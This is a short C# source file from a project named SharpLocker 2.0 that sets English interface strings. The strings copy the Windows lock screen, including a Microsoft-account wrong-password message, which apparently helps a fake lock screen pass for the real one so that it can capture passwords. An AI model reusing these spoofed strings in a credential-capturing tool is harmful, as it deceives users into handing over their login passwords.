using SharpLocker_2._0.Interfaces;

namespace SharpLocker_2._0.Models
{
    public class EnglishLanguage : ILanguage
    {
        public string Identifier => "ENG";

        public void Apply(Language language)
        {
            language.CapsLockText = "CAPS LOCK is on";
            language.OtherUserText = "Other User";
            language.PlaceholderText = "Password";
            language.WrongPasswordText = @"That password is incorrect. Make sure you're using the password for your Microsoft account. If you can't remember your password, you can 
reset it from the lock screen or at account.live.com/password/reset.";
            language.Keyboard = "Keyboard";
        }
    }
}
